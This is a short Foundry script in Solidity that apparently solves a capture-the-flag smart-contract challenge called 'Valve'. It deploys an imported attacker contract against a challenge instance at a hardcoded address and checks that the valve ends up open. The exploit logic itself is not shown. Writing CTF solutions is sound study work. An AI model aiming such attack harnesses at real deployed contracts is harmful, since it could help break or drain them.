// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Valve.sol";
import "../src/attackers/ValveAttacker.sol";

contract ValveTest is Script {
    Valve public target;
    Nozzle public attacker;
    address instanceAddress = 0x06b5763cD69a65E6AD3d7Cd8fe0d1F84e2AcD360;

    function setUp() public {
        target = Valve(payable(instanceAddress));
        attacker = new Nozzle();
        vm.label(address(target), "Challenge");
    }

    function run() public {
        attacker.attack{gas: 100000}(target);

        require(target.open(), "Failed");
    }
}
